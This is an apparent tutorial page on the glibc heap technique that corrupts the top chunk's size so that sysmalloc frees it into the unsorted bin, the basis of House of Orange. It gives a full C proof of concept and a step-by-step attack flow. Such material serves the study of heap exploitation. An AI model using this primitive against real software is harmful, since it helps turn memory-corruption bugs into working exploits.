#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "sysmalloc: _int_free on Top Chunk",
    description: "Exploiting sysmalloc to trigger an implicit _int_free on the top chunk by corrupting its size metadata.",
    date: "2025-12-26",
    order: 36,
  ),
)<frontmatter>

= glibc Allocator: sysmalloc \_int_free

== Introduction

The `sysmalloc` function in glibc is responsible for extending the heap when the current **Top Chunk** (wilderness) is too small to satisfy a `malloc()` request. A clever technique involves corrupting the Top Chunk's `size` field to trigger an implicit call to `_int_free()` on the Top Chunk itself.

When `sysmalloc` is called to grow the heap (usually via `mmap` or `sbrk`), it performs several checks. If the attacker has corrupted the Top Chunk's size such that it is still page-aligned but much smaller than before, and then requests an allocation larger than this new size, `sysmalloc` may decide it cannot merge the old top chunk with the newly acquired memory. Instead, it will **free the old top chunk**.

This primitive is extremely powerful because it allows an attacker to place a chunk into the Unsorted Bin without ever calling `free()` directly on a pointer. This technique is a core component of advanced attacks like the **House of Orange** and **House of Tangerine**.

== Prerequisites
- *Top Chunk Size Corruption*: Ability to overwrite the `size` field of the Top Chunk (Wilderness).
- *Alignment Knowledge*: The new size must be page-aligned and have the `PREV_INUSE` bit set to pass internal glibc checks.
- *Large Allocation*: Ability to trigger a `malloc()` request larger than the corrupted Top Chunk size, forcing the allocator to call `sysmalloc`.

== Example Code

This PoC demonstrates how to trigger `sysmalloc` to free the Top Chunk.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)
#define CHUNK_HDR_SZ (SIZE_SZ*2)
#define MALLOC_ALIGN 0x10
#define MALLOC_MASK (-MALLOC_ALIGN)
#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)
#define FENCEPOST (2*CHUNK_HDR_SZ)
#define PROBE (0x20-CHUNK_HDR_SZ)
#define CHUNK_FREED_SIZE 0x150
#define FREED_SIZE (CHUNK_FREED_SIZE-CHUNK_HDR_SZ)

int main() {
  size_t allocated_size, *top_size_ptr, top_size, new_top_size, freed_top_size, *new, *old;

  // 1. Initial allocation to find the top chunk
  new = malloc(PROBE);
  top_size = new[(PROBE / SIZE_SZ) + 1];
  printf("Initial top size: 0x%lx\n", top_size);

  // 2. Align heap to a predictable state
  allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
  allocated_size &= PAGE_MASK;
  allocated_size &= MALLOC_MASK;
  new = malloc(allocated_size);

  // 3. Locate the Top Chunk header
  top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];
  top_size = *top_size_ptr;

  // ------------ VULNERABILITY ------------
  // Corrupt the Top Chunk size to be smaller, but still page-aligned.
  // The size must also have the PREV_INUSE bit set.
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;
  // ---------------------------------------

  // 4. Trigger sysmalloc
  // Request an allocation larger than our new corrupted top size.
  // This causes sysmalloc to free the old top chunk.
  malloc(CHUNK_FREED_SIZE + 0x10);

  // 5. Reallocate from the freed top chunk
  // The old top chunk is now in the Unsorted Bin.
  void* reclaimed = malloc(FREED_SIZE);
  printf("Reclaimed chunk from old top: %p\n", reclaimed);

  assert((size_t)reclaimed < (size_t)top_size_ptr);
}
```

== Attack Flow Explained

=== 1. Preparation and Alignment

For the attack to succeed, the Top Chunk's size must remain **page-aligned** and have the `PREV_INUSE` bit set. The PoC calculates an `allocated_size` that consumes just enough memory so that the remaining Top Chunk ends exactly at a page boundary.

=== 2. The Vulnerability: Top Size Corruption

The attacker uses a heap overflow or Out-of-Bounds (OOB) write to modify the Top Chunk's `size` field. By reducing the size, we trick `sysmalloc` into thinking the "wilderness" is much smaller than it actually is.

=== 3. Triggering sysmalloc

We then perform a `malloc()` call that is larger than our corrupted Top Chunk size. Because the Top Chunk cannot satisfy the request, the allocator calls `sysmalloc` to request more memory from the OS.

=== 4. Implicit `free()`

Inside `sysmalloc`, the code checks if the new memory can be merged with the old Top Chunk. Because we've corrupted the size, the alignment checks fail or the allocator decides to create a new arena/mapping.

The critical logic in `malloc.c` is:
```c
if (old_size >= MINSIZE)
{
    _int_free (av, old_top, 1);
}
```
The old Top Chunk is passed to `_int_free()`, placing it into the **Unsorted Bin**.

=== 5. Exploitation

Once the Top Chunk is in the Unsorted Bin, we have successfully created a "Free" chunk in a location we control (the end of the original heap) without ever calling `free()`. We can now use this for standard Unsorted Bin attacks, or re-allocate from it to obtain overlapping chunks.

== Key Requirements

- *Heap Leak/Relative Write*: Ability to overwrite the Top Chunk header.
- *Alignment*: The corrupted size must be page-aligned (e.g., `0x1001`, `0x2001`, etc. for a 4KB page).
- *Size Constraints*: The corrupted size must be larger than `MINSIZE` but smaller than the next `malloc` request.

